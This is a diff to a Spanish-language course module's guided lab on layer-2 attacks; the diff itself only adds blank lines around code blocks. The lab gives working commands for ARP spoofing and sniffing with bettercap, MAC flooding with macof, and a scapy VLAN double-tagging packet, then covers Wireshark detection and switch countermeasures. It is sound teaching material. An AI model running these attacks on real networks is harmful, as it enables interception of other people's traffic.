@@ -54,10 +54,13 @@ Al finalizar, el alumno podrá:
 ## 🧪 Laboratorio guiado
 
 1. **Habilita el reenvío** en la máquina atacante (para MitM transparente):
+
    ```bash
    sudo sysctl -w net.ipv4.ip_forward=1
    ```
+
 2. **ARP spoofing** entre víctima y gateway con bettercap:
+
    ```bash
    sudo bettercap -iface eth0
    # dentro de bettercap:
@@ -65,21 +68,28 @@ Al finalizar, el alumno podrá:
    arp.spoof on
    net.sniff on
    ```
+
 3. **Verifica el envenenamiento** desde la víctima:
+
    ```bash
    arp -a    # la MAC del gateway ahora es la del atacante
    ```
+
 4. **MAC flooding** en un switch de laboratorio (observa el fail-open):
+
    ```bash
    sudo macof -i eth0
    ```
+
    Captura en paralelo para ver tráfico que antes no verías.
 5. **VLAN hopping por double tagging** con scapy (esquema):
+
    ```python
    from scapy.all import *
    pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="10.20.0.5")/ICMP()
    sendp(pkt, iface="eth0")
    ```
+
 6. **Detección defensiva**: en Wireshark filtra `arp.duplicate-address-detected` y observa múltiples MAC para una misma IP.
 7. **Contramedidas** (en el switch): activa DHCP snooping + DAI, `switchport port-security maximum 2`, y deshabilita DTP (`switchport nonegotiate`).
 
